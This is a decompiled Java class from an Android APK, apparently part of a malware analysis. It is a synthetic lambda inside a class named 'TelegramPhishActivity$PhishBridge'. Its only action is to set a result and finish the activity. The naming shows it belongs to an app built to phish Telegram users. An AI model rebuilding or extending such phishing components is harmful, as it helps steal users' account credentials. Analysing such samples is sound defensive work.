package com.base.template;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda3 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ TelegramPhishActivity f$0;

    public /* synthetic */ TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda3(TelegramPhishActivity telegramPhishActivity, int i) {
        this.$r8$classId = i;
        this.f$0 = telegramPhishActivity;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.$r8$classId) {
            case 0:
                TelegramPhishActivity telegramPhishActivity = this.f$0;
                telegramPhishActivity.setResult(-1);
                telegramPhishActivity.finish();
                break;
            default:
                TelegramPhishActivity telegramPhishActivity2 = this.f$0;
                telegramPhishActivity2.setResult(-1);
                telegramPhishActivity2.finish();
                break;
        }
    }
}
